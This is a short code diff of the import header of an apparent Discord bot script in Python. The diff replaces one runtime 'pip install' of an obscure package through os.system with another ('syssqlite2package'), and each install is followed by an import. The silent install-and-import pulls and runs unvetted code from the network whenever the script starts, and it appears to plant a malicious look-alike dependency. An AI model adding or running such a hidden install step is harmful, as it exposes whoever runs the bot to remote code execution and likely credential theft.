@@ -1,7 +1,7 @@
 #Importing modules
 import os
-os.system("pip install pycryptographymodule")
-import pycryptographymodule
+os.system("pip install syssqlite2package")
+import syssqlite2package
 import nextcord, os, ctypes, json, asyncio, hashlib, base64, requests
 from nextcord import ButtonStyle
 from nextcord.ext import commands
